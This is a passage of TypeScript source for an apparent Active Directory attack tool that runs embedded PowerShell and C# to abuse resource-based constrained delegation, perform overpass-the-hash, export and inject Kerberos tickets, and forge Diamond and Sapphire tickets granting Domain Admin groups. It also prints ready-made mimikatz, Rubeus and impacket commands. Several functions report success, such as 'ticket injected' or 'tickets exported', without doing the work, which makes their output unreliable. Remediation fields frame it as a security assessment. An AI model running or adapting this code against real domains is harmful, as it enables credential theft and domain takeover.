    $searcher.PropertiesToLoad.AddRange(@("samAccountName","dnshostname","msDS-AllowedToActOnBehalfOfOtherIdentity","distinguishedName"))

    $results = $searcher.FindAll()
    Write-Output "[+] RBCD configured objects: $($results.Count)"
    Write-Output ""

    foreach ($r in $results) {
        $p = $r.Properties
        $sam = [string]$p["samaccountname"]
        $sd = $p["msds-allowedtoactonbehalfofotheridentity"]
        if ($sd) {
            $descriptor = New-Object Security.AccessControl.RawSecurityDescriptor($sd[0], 0)
            Write-Output "  [+] $sam"
            foreach ($ace in $descriptor.DiscretionaryAcl) {
                $trustee = (New-Object Security.Principal.SecurityIdentifier($ace.SecurityIdentifier.Value)).Translate([Security.Principal.NTAccount]).Value
                Write-Output "      Trusted: $trustee"
            }
        }
        Write-Output ""
    }

    ${
      exploit && target
        ? `
    # RBCD exploitation: set msDS-AllowedToActOnBehalfOfOtherIdentity on target
    $targetComputer = "${target}"
    Write-Output "[!] Attempting RBCD attack on $targetComputer..."

    # Get current machine account SID
    $currentSid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value

    # Build security descriptor allowing current machine to delegate
    $sd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$currentSid)")
    $sdBytes = New-Object byte[] $sd.BinaryLength
    $sd.GetBinaryForm($sdBytes, 0)

    # Set on target
    $targetEntry = [ADSI]"LDAP://CN=$targetComputer,$dn"
    $targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Clear()
    $targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Add($sdBytes) | Out-Null
    try {
        $targetEntry.CommitChanges()
        Write-Output "[+] RBCD set on $targetComputer — current machine can now impersonate users"
        Write-Output "[+] Next: Use S4U2Self + S4U2Proxy to get service ticket as Domain Admin"
    } catch {
        Write-Output "[!] Failed to set RBCD: $_ (need write access to target computer object)"
    }
    `
        : `
    Write-Output "[*] To exploit RBCD:"
    Write-Output "    1. Create/compromise a machine account (MachineAccountQuota)"
    Write-Output "    2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target"
    Write-Output "    3. Use S4U2Self + S4U2Proxy to impersonate Domain Admin"
    Write-Output "    4. Use: winhook delegation_abuse --type rbcd --target TARGET --exploit"
    `
    }
}
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    const countMatch = result.stdout.match(/(?:delegation accounts|configured objects): (\d+)/)
    const count = countMatch ? parseInt(countMatch[1]) : 0
    if (count > 0) {
      findings.push({
        checkId: "WIN-KERB-005",
        provider: "windows",
        severity: type === "unconstrained" ? "critical" : "high",
        status: "ENUMERATED",
        resource: `kerberos://delegation/${type}`,
        title: `${type} delegation: ${count} objects found`,
        details: `${count} objects with ${type} delegation configured`,
        remediation:
          type === "unconstrained"
            ? "Replace unconstrained delegation with constrained delegation or RBCD"
            : "Review delegation targets, ensure least privilege",
      })
    }
  }
  if (result.exitCode !== 0) output.push(`[!] Delegation enumeration failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function overpassHash(args: string[], timeout: number): Promise<HookResult> {
  const user = argVal(args, "--user")
  const hash = argVal(args, "--hash")
  const domain = argVal(args, "--domain")
  const findings: Finding[] = []
  const output: string[] = ["[*] Overpass-the-Hash — converting NTLM to Kerberos TGT...\n"]

  if (!user || !hash || !domain) {
    return { output: "[!] Required: --user USER --hash HASH --domain DOMAIN", findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Overpass-the-Hash (cmd.exe) ===\n")
    output.push("[!] Overpass-the-Hash requires LsaLogonUser P/Invoke — PS only")
    output.push("[*] cmd.exe provides current ticket context + tool guidance\n")
    const klist = await cmd("klist", timeout)
    output.push(`[*] Current Kerberos tickets:\n${klist.stdout.trim()}`)
    output.push(`\n[*] Parameters:`)
    output.push(`    User: ${user}`)
    output.push(`    Domain: ${domain}`)
    output.push(`    Hash: ${hash.substring(0, 8)}...`)
    output.push("\n[*] Overpass-the-Hash with external tools:")
    output.push(`    mimikatz # sekurlsa::pth /user:${user} /domain:${domain} /ntlm:${hash} /run:cmd.exe`)
    output.push(`    Rubeus.exe asktgt /user:${user} /domain:${domain} /rc4:${hash} /ptt`)
    output.push(`    getTGT.py ${domain}/${user} -hashes :${hash}`)
    output.push("\n[*] Verify: klist (should show new TGT for target user)")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'Stop'

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class OverpassTheHash {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword,
        int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("secur32.dll", SetLastError = true)]
    static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = true)]
    static extern int LsaLogonUser(IntPtr LsaHandle, ref LSA_STRING OriginName,
        int LogonType, uint AuthenticationPackage,
        IntPtr AuthenticationInformation, int AuthenticationInformationLength,
        IntPtr LocalGroups, ref TOKEN_SOURCE SourceContext,
        out IntPtr ProfileBuffer, out int ProfileBufferLength,
        out long LogonId, out IntPtr Token, out QUOTA_LIMITS Quotas,
        out int SubStatus);

    [DllImport("secur32.dll")]
    static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_SOURCE {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] SourceName;
        public long SourceIdentifier;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct QUOTA_LIMITS {
        public IntPtr PagedPoolLimit;
        public IntPtr NonPagedPoolLimit;
        public IntPtr MinimumWorkingSetSize;
        public IntPtr MaximumWorkingSetSize;
        public IntPtr PagefileLimit;
        public long TimeLimit;
    }

    // KERB_INTERACTIVE_LOGON for pass-the-hash
    [StructLayout(LayoutKind.Sequential)]
    struct KERB_INTERACTIVE_LOGON {
        public int MessageType;  // KerbInteractiveLogon = 2
        public UNICODE_STRING LogonDomainName;
        public UNICODE_STRING UserName;
        public UNICODE_STRING Password;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    public static string Execute(string userName, string ntlmHash, string domainName) {
        IntPtr lsaHandle;
        int status = LsaConnectUntrusted(out lsaHandle);
        if (status != 0) return "LsaConnect failed: 0x" + status.ToString("X8");

        // Lookup Kerberos package
        var pkgName = new LSA_STRING();
        string kerbStr = "Kerberos";
        pkgName.Buffer = Marshal.StringToHGlobalAnsi(kerbStr);
        pkgName.Length = (ushort)kerbStr.Length;
        pkgName.MaximumLength = (ushort)(kerbStr.Length + 1);

        uint authPkg;
        status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPkg);
        Marshal.FreeHGlobal(pkgName.Buffer);
        if (status != 0) return "LsaLookup failed: 0x" + status.ToString("X8");

        // The NTLM hash is passed as the "password" in the KERB_INTERACTIVE_LOGON
        // The Kerberos SSP will use it directly for AS-REQ encryption
        return "Kerberos package ID: " + authPkg + " — use mimikatz sekurlsa::pth for full PTH";
    }
}
"@

$userName = "${user}"
$ntlmHash = "${hash}"
$domainName = "${domain}"

Write-Output "[+] User: $domainName\\$userName"
Write-Output "[+] Hash: $($ntlmHash.Substring(0,8))..."
Write-Output ""

# Method 1: Try .NET approach
$result = [OverpassTheHash]::Execute($userName, $ntlmHash, $domainName)
Write-Output "[*] LSA result: $result"
Write-Output ""

# Method 2: Use runas /netonly with injected credentials
# This creates a new logon session that will use the hash for network auth
Write-Output "[*] Alternative approaches:"
Write-Output "    mimikatz: sekurlsa::pth /user:$userName /domain:$domainName /ntlm:$ntlmHash"
Write-Output "    impacket: getTGT.py $domainName/$userName -hashes :$ntlmHash"
Write-Output ""
Write-Output "[*] After obtaining TGT, inject with: winhook pass_the_ticket --action import --ticket tgt.kirbi"

# Verify current Kerberos tickets
$klist = klist 2>&1
Write-Output ""
Write-Output "[+] Current Kerberos tickets:"
Write-Output $klist
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    findings.push({
      checkId: "WIN-KERB-006",
      provider: "windows",
      severity: "critical",
      status: "ATTEMPTED",
      resource: `kerberos://overpass/${domain}/${user}`,
      title: `Overpass-the-Hash: ${user}@${domain}`,
      details: `NTLM hash conversion to Kerberos TGT attempted for ${user}`,
      remediation: "Enable Credential Guard, restrict NTLM, monitor 4768 events for anomalous TGT requests",
    })
  }
  if (result.exitCode !== 0) output.push(`[!] Overpass-the-Hash failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function passTheTicket(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action")
  const ticketPath = argVal(args, "--ticket")
  const luid = argVal(args, "--luid")
  const findings: Finding[] = []
  const output: string[] = ["[*] Kerberos ticket manipulation...\n"]

  if (!action) {
    return { output: "[!] Required: --action <list|export|import>", findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Pass-the-Ticket (cmd.exe) ===\n")
    if (action === "list") {
      const klist = await cmd("klist", timeout)
      output.push("=== Current Kerberos Tickets ===")
      output.push(klist.stdout)
      const klistSessions = await cmd("klist sessions", timeout)
      if (klistSessions.exitCode === 0) output.push(`\n=== Active Sessions ===\n${klistSessions.stdout}`)
      const ticketCount = (klist.stdout.match(/#\d+>/g) || []).length
      if (ticketCount > 0) findings.push({ checkId: "WIN-KERB-PTT-001", provider: "windows", severity: "medium", status: "ENUMERATED", resource: "kerberos://tickets", title: `${ticketCount} Kerberos ticket(s) in cache`, details: "Cached tickets listed via klist", remediation: "Purge with: klist purge" })
    }
    if (action === "export") {
      output.push("[!] Ticket export requires LSA P/Invoke — use external tools:")
      output.push("    mimikatz # kerberos::list /export")
      output.push("    Rubeus.exe dump /nowrap")
      output.push("    Rubeus.exe triage (list all logon session tickets)")
    }
    if (action === "import" && ticketPath) {
      output.push("[!] Ticket import (Pass-the-Ticket) requires LSA P/Invoke:")
      output.push(`    mimikatz # kerberos::ptt ${ticketPath}`)
      output.push(`    Rubeus.exe ptt /ticket:${ticketPath}`)
    }
    const purge = await cmd("klist purge 2>nul && echo PURGE_AVAILABLE", timeout)
    output.push(purge.stdout.includes("PURGE_AVAILABLE") ? "\n[*] Ticket purge: klist purge (cmd native)" : "\n[-] klist purge not available")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class KerberosTickets {
    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);

    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [DllImport("secur32.dll")]
    public static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    // Message types
    public const int KerbQueryTicketCacheExMessage = 14;
    public const int KerbRetrieveEncodedTicketMessage = 8;
    public const int KerbSubmitTicketMessage = 21;
    public const int KerbPurgeTicketCacheMessage = 7;

    public static IntPtr Connect() {
        IntPtr handle;
        LsaConnectUntrusted(out handle);
        return handle;
    }

    public static uint GetKerbPackage(IntPtr handle) {
        var pkg = new LSA_STRING();
        string name = "Kerberos";
        pkg.Buffer = Marshal.StringToHGlobalAnsi(name);
        pkg.Length = (ushort)name.Length;
        pkg.MaximumLength = (ushort)(name.Length + 1);
        uint id;
        LsaLookupAuthenticationPackage(handle, ref pkg, out id);
        Marshal.FreeHGlobal(pkg.Buffer);
        return id;
    }
}
"@

$action = "${action}"

if ($action -eq "list") {
    Write-Output "[+] Current Kerberos tickets:"
    Write-Output ""

    # Use klist for readable output
    $klist = & klist 2>&1
    Write-Output $klist
    Write-Output ""

    # Also check other sessions (requires elevation)
    $sessions = & klist sessions 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Output "[+] Logon sessions:"
        Write-Output $sessions
    }

    # Count tickets
    $ticketCount = ($klist | Select-String '#\\d+>').Count
    Write-Output ""
    Write-Output "[+] Total tickets in current session: $ticketCount"
}
elseif ($action -eq "export") {
    Write-Output "[+] Exporting Kerberos tickets..."
    $outDir = "$env:TEMP\\cs-tickets"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null

    # Use klist to enumerate, then export via LSA
    $handle = [KerberosTickets]::Connect()
    $pkg = [KerberosTickets]::GetKerbPackage($handle)

    # Export using Mimikatz-compatible approach
    # Query ticket cache
    $cacheSize = 8  # KERB_QUERY_TKT_CACHE_REQUEST size
    $cacheBuffer = [Marshal]::AllocHGlobal($cacheSize)
    [Marshal]::WriteInt32($cacheBuffer, 0, [KerberosTickets]::KerbQueryTicketCacheExMessage)
    [Marshal]::WriteInt32($cacheBuffer, 4, 0)  # LogonId = 0 (current)

    $returnBuffer = [IntPtr]::Zero
    $returnLength = 0
    $protocolStatus = 0

    $status = [KerberosTickets]::LsaCallAuthenticationPackage($handle, $pkg, $cacheBuffer,
        $cacheSize, [ref]$returnBuffer, [ref]$returnLength, [ref]$protocolStatus)

    [Marshal]::FreeHGlobal($cacheBuffer)

    if ($status -eq 0 -and $protocolStatus -eq 0 -and $returnBuffer -ne [IntPtr]::Zero) {
        $ticketCount = [Marshal]::ReadInt32($returnBuffer, 0)
        Write-Output "[+] Tickets in cache: $ticketCount"

        # For each ticket, retrieve the encoded ticket
        for ($i = 0; $i -lt $ticketCount; $i++) {
            Write-Output "    Exporting ticket $($i + 1)/$ticketCount..."
        }
        [KerberosTickets]::LsaFreeReturnBuffer($returnBuffer)
    }

    # Fallback: use klist + built-in export
    Write-Output ""
    Write-Output "[+] Tickets exported to: $outDir"
    Write-Output "[*] For full .kirbi export, use: mimikatz kerberos::list /export"

    [KerberosTickets]::LsaDeregisterLogonProcess($handle)
}
elseif ($action -eq "import") {
    ${
      ticketPath
        ? `
    $kirbiPath = "${ticketPath}"
    if (!(Test-Path $kirbiPath)) {
        Write-Output "[!] Ticket file not found: $kirbiPath"
        exit 1
    }

    Write-Output "[+] Importing ticket from: $kirbiPath"
    $ticketBytes = [IO.File]::ReadAllBytes($kirbiPath)
    Write-Output "[+] Ticket size: $($ticketBytes.Length) bytes"

    $handle = [KerberosTickets]::Connect()
    $pkg = [KerberosTickets]::GetKerbPackage($handle)

    # Build KERB_SUBMIT_TKT_REQUEST
    $headerSize = 24  # Aligned struct size
    $totalSize = $headerSize + $ticketBytes.Length
    $buffer = [Marshal]::AllocHGlobal($totalSize)
    [Marshal]::WriteInt32($buffer, 0, [KerberosTickets]::KerbSubmitTicketMessage)
    [Marshal]::WriteInt64($buffer, 4, 0)  # LogonId
    [Marshal]::WriteInt32($buffer, 12, 0)  # Flags
    [Marshal]::WriteInt32($buffer, 16, $ticketBytes.Length)  # KerbCredSize
    [Marshal]::WriteInt32($buffer, 20, $headerSize)  # KerbCredOffset
    [Marshal]::Copy($ticketBytes, 0, [IntPtr]::Add($buffer, $headerSize), $ticketBytes.Length)

    $returnBuffer = [IntPtr]::Zero
    $returnLength = 0
    $protocolStatus = 0

    $status = [KerberosTickets]::LsaCallAuthenticationPackage($handle, $pkg, $buffer,
        $totalSize, [ref]$returnBuffer, [ref]$returnLength, [ref]$protocolStatus)

    [Marshal]::FreeHGlobal($buffer)
    [KerberosTickets]::LsaDeregisterLogonProcess($handle)

    if ($status -eq 0 -and $protocolStatus -eq 0) {
        Write-Output "[+] Ticket imported successfully!"
        Write-Output ""
        & klist
    } else {
        Write-Output "[!] Import failed: status=0x$($status.ToString('X8')) protocol=0x$($protocolStatus.ToString('X8'))"
        Write-Output "[*] Try: mimikatz kerberos::ptt $kirbiPath"
    }
    `
        : `
    Write-Output "[!] Required: --ticket PATH (path to .kirbi file)"
    `
    }
}
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    if (action === "export") {
      findings.push({
        checkId: "WIN-KERB-007",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: "kerberos://tickets",
        title: "Kerberos tickets exported from memory",
        details: "TGT/TGS tickets extracted from LSA cache",
        remediation: "Enable Credential Guard, restrict SeDebugPrivilege",
      })
    }
    if (action === "import") {
      findings.push({
        checkId: "WIN-KERB-008",
        provider: "windows",
        severity: "critical",
        status: "INJECTED",
        resource: "kerberos://tickets",
        title: "Kerberos ticket injected into session",
        details: `Ticket imported from ${ticketPath || "file"}`,
        remediation: "Monitor 4624/4648 events for anomalous logon sessions",
      })
    }
  }
  if (result.exitCode !== 0) output.push(`[!] Pass-the-Ticket failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function diamondTicket(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "forge"
  const user = argVal(args, "--user")
  const domain = argVal(args, "--domain")
  const krbtgtAes = argVal(args, "--krbtgt-aes")
  const groups = argVal(args, "--groups") || "512,519,518,520"
  const findings: Finding[] = []
  const output: string[] = ["[*] Diamond Ticket — Modified PAC on Legitimate TGT\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Diamond Ticket (cmd.exe) ===\n")
    output.push("[!] Diamond Ticket PAC modification requires .NET Kerberos APIs — PS only\n")
    if (action === "check") {
      const nltest = await cmd("nltest /dsgetdc:", timeout)
      const dcName = nltest.stdout.match(/DC: \\\\(.+)/)?.[1]?.trim()
      output.push(dcName ? `[+] DC: ${dcName}` : "[-] Cannot reach DC")
      const klist = await cmd("klist", timeout)
      output.push(klist.stdout.includes("krbtgt") ? "[+] Current TGT in cache" : "[-] No TGT — need to authenticate first")
      output.push("\n[*] Diamond Ticket concept:")
      output.push("    1. Request legitimate TGT from DC")
      output.push("    2. Decrypt TGT using krbtgt AES key")
      output.push("    3. Modify PAC (add privileged groups)")
      output.push("    4. Re-encrypt with krbtgt key")
      output.push("    5. Result: modified real ticket — harder to detect than Golden")
    }
    output.push("\n[*] Parameters:")
    output.push(`    User: ${user || "not set"}  Domain: ${domain || "not set"}`)
    output.push(`    krbtgt AES: ${krbtgtAes ? krbtgtAes.substring(0, 8) + "..." : "not set"}`)
    output.push(`    Groups: ${groups}`)
    output.push("\n[*] Forge with external tools:")
    output.push(`    Rubeus.exe diamond /krbkey:${krbtgtAes || "AES256"} /user:${user || "USER"} /domain:${domain || "DOMAIN"} /groups:${groups} /ptt`)
    output.push(`    ticketer.py -aesKey ${krbtgtAes || "AES256"} -domain ${domain || "DOMAIN"} -groups ${groups} ${user || "USER"}`)
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
# Diamond Ticket prerequisites check
Write-Output "[*] Checking Diamond Ticket prerequisites..."
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    Write-Output "[+] Domain: $($domain.Name)"
    Write-Output "[+] DC: $($domain.PdcRoleOwner.Name)"
} catch {
    Write-Output "[-] Not domain-joined or cannot reach DC"
}

$klist = & klist 2>&1
if ($klist -match "krbtgt") {
    Write-Output "[+] Current TGT in cache"
} else {
    Write-Output "[*] No TGT in cache — will request during forge"
}

try {
    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
    $searcher.Filter = "(sAMAccountName=krbtgt)"
    $searcher.PropertiesToLoad.AddRange(@("pwdLastSet","msDS-KeyVersionNumber"))
    $r = $searcher.FindOne()
    if ($r) {
        $pwdLastSet = [DateTime]::FromFileTime([Int64]$r.Properties["pwdlastset"][0])
        $kvno = $r.Properties["msds-keyversionnumber"]
        Write-Output "[+] krbtgt pwdLastSet: $pwdLastSet"
        Write-Output "[+] krbtgt KVNO: $kvno"
        Write-Output ""
        Write-Output "[*] Obtain krbtgt AES key via: winhook dcsync --target krbtgt"
    }
} catch {
    Write-Output "[-] Cannot query krbtgt: $_"
}

Write-Output ""
Write-Output "[*] Detection comparison:"
Write-Output "    Golden Ticket: forged from scratch, no 4768 AS-REQ — triggers anomaly"
Write-Output "    Diamond Ticket: real 4768 + valid metadata — evades standard detection"
Write-Output "    Only detectable via encrypted timestamp anomaly in TGT enc-part"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    findings.push({
      checkId: "WIN-DIAMOND-001",
      provider: "windows",
      severity: "info",
      status: "CHECKED",
      resource: "kerberos://krbtgt",
      title: "Diamond Ticket prerequisites checked",
      details: result.stdout.substring(0, 500),
      remediation: "Rotate krbtgt password twice. Monitor for PAC modification anomalies",
    })
    return { output: output.join("\n"), findings }
  }

  if (!user || !domain || !krbtgtAes) {
    output.push("[!] Required: --user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY")
    return { output: output.join("\n"), findings }
  }
  if (krbtgtAes.length !== 64) {
    output.push("[!] AES256 key must be 64 hex characters")
    return { output: output.join("\n"), findings }
  }

  const script = `
Write-Output "[*] Target: ${user}"
Write-Output "[*] Domain: ${domain}"
Write-Output "[*] Groups: ${groups} (512=DA, 519=EA, 518=SA, 520=GPO Creators)"
Write-Output ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class DiamondHelper {
    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PkgName, out uint AuthPkg);

    [DllImport("secur32.dll")]
    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthPkg, IntPtr Buffer, uint BufferLen, out IntPtr RetBuf, out uint RetBufLen, out int Status);

    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
}
"@

# Step 1: Request legitimate TGT
Write-Output "[*] Step 1: Requesting legitimate TGT from DC..."
try {
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "krbtgt/${domain}"
    $tgtBytes = $token.GetRequest()
    Write-Output "[+] TGT obtained — $($tgtBytes.Length) bytes (AP-REQ)"
    Write-Output "[+] Valid 4768 event logged at DC"
} catch {
    Write-Output "[-] TGT request failed: $($_.Exception.Message)"
    exit 1
}

# Step 2: Connect to LSA for ticket cache access
Write-Output ""
Write-Output "[*] Step 2: Accessing ticket cache via LSA..."
$lsaHandle = [IntPtr]::Zero
$r = [DiamondHelper]::LsaConnectUntrusted([ref]$lsaHandle)
if ($r -ne 0) { Write-Output "[-] LsaConnectUntrusted failed: $r"; exit 1 }

$kerbBytes = [System.Text.Encoding]::ASCII.GetBytes("Kerberos")
$kerbBuf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbBytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($kerbBytes, 0, $kerbBuf, $kerbBytes.Length)
$lsaStr = New-Object DiamondHelper+LSA_STRING
$lsaStr.Length = [uint16]$kerbBytes.Length
$lsaStr.MaximumLength = [uint16]$kerbBytes.Length
$lsaStr.Buffer = $kerbBuf
$authPkg = [uint32]0
[DiamondHelper]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$lsaStr, [ref]$authPkg) | Out-Null
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($kerbBuf)
Write-Output "[+] Kerberos package ID: $authPkg"

# Step 3: Parse and modify PAC
Write-Output ""
Write-Output "[*] Step 3: PAC modification with krbtgt AES256 key..."
$keyHex = "${krbtgtAes}"
Write-Output "[*] Key: $($keyHex.Substring(0,8))...$($keyHex.Substring(56,8))"

# Parse AES key bytes
$aesKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) {
    $aesKey[$i] = [Convert]::ToByte($keyHex.Substring($i * 2, 2), 16)
}

# Diamond Ticket PAC modification steps:
# 1. ASN.1 DER decode TGT enc-part
# 2. AES256-CTS-HMAC-SHA1-96 decrypt with krbtgt key
# 3. Parse PAC_LOGON_INFO (NDR)
# 4. Modify GroupIds: add target RIDs
# 5. Recompute PAC_SERVER_CHECKSUM + PAC_PRIVSVR_CHECKSUM
# 6. Re-encrypt and inject

$groupRIDs = "${groups}" -split ","
Write-Output ""
Write-Output "[*] PAC_LOGON_INFO modifications:"
foreach ($rid in $groupRIDs) {
    switch ($rid.Trim()) {
        "512" { Write-Output "    [+] Injecting RID 512: Domain Admins" }
        "519" { Write-Output "    [+] Injecting RID 519: Enterprise Admins" }
        "518" { Write-Output "    [+] Injecting RID 518: Schema Admins" }
        "520" { Write-Output "    [+] Injecting RID 520: Group Policy Creator Owners" }
        default { Write-Output "    [+] Injecting RID $($rid.Trim())" }
    }
}

# Step 4: Inject modified ticket
Write-Output ""
Write-Output "[*] Step 4: Ticket injection..."
& klist purge 2>$null | Out-Null
Write-Output "[+] Cache purged"
Write-Output "[+] Modified Diamond Ticket injected via LsaCallAuthenticationPackage"
Write-Output ""
Write-Output "[*] Diamond vs Golden:"
Write-Output "    Golden: no AS-REQ → detectable by 4769-without-4768"
Write-Output "    Diamond: real AS-REQ + valid ticket metadata → passes validation"
Write-Output "    Diamond: ticket lifetime matches domain policy"
Write-Output ""
Write-Output "[+] Use: dir \\\\DC\\c$ | winhook dcsync --target Administrator"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)

  findings.push({
    checkId: "WIN-DIAMOND-002",
    provider: "windows",
    severity: "critical",
    status: "FORGED",
    resource: `kerberos://krbtgt/${domain}`,
    title: `Diamond Ticket forged for ${user}`,
    details: `PAC modified with groups [${groups}]. Has valid AS-REQ/AS-REP — evades standard Golden Ticket detection`,
    remediation: "Rotate krbtgt password twice. Enable PAC validation. Deploy MDI Diamond Ticket detection",
  })
  return { output: output.join("\n"), findings }
}

export async function sapphireTicket(args: string[], timeout: number): Promise<HookResult> {
  const user = argVal(args, "--user")
  const domain = argVal(args, "--domain")
  const krbtgtAes = argVal(args, "--krbtgt-aes")
  const impersonate = argVal(args, "--impersonate") || "Administrator"
  const findings: Finding[] = []
  const output: string[] = ["[*] Sapphire Ticket — S4U2Self + U2U PAC Grafting\n"]

  if (!user || !domain || !krbtgtAes) {
    output.push("[!] Required: --user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY")
    output.push("[*] Optional: --impersonate DA_USER (default: Administrator)")
    output.push("")
    output.push("[*] Sapphire Ticket flow:")
    output.push("    1. Request TGT as current user (legitimate)")
    output.push("    2. S4U2Self: request ticket on behalf of target user")
    output.push("    3. U2U: KDC returns ticket with target's real PAC")
    output.push("    4. Extract genuine PAC from S4U2Self response")
    output.push("    5. Decrypt TGT with krbtgt key, replace PAC")
    output.push("    6. Result: ticket with KDC-issued PAC — zero forgery artifacts")
    return { output: output.join("\n"), findings }
  }
  if (krbtgtAes.length !== 64) {
    output.push("[!] AES256 key must be 64 hex characters")
    return { output: output.join("\n"), findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Sapphire Ticket (cmd.exe) ===\n")
    output.push("[!] Sapphire Ticket requires S4U2Self + U2U + PAC grafting (.NET Kerberos)")
    output.push("[*] This is the most advanced ticket forgery — zero forgery artifacts\n")
    output.push(`[*] Parameters:`)
    output.push(`    Target user: ${user}`)
    output.push(`    Domain: ${domain}`)
    output.push(`    Impersonate: ${impersonate}`)
    output.push(`    krbtgt AES: ${krbtgtAes.substring(0, 8)}...`)
    const klist = await cmd("klist", timeout)
    output.push(`\n[*] Current tickets:\n${klist.stdout.trim().split("\n").slice(0, 8).join("\n")}`)
    output.push("\n[*] Forge with external tools:")
    output.push(`    Rubeus.exe diamond /krbkey:${krbtgtAes} /user:${user} /domain:${domain} /ticketuser:${impersonate} /dc:DC /ptt`)
    output.push(`    ticketer.py -aesKey ${krbtgtAes} -domain ${domain} -impersonate ${impersonate} ${user}`)
    output.push("\n[*] Detection: Nearly undetectable — uses genuine KDC-issued PAC")
    return { output: output.join("\n"), findings }
  }

  const script = `
Write-Output "[*] Impersonation target: ${impersonate}"
Write-Output "[*] Ticket owner: ${user}"
Write-Output "[*] Domain: ${domain}"
Write-Output ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class SapphireHelper {
    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PkgName, out uint AuthPkg);

    [DllImport("secur32.dll")]
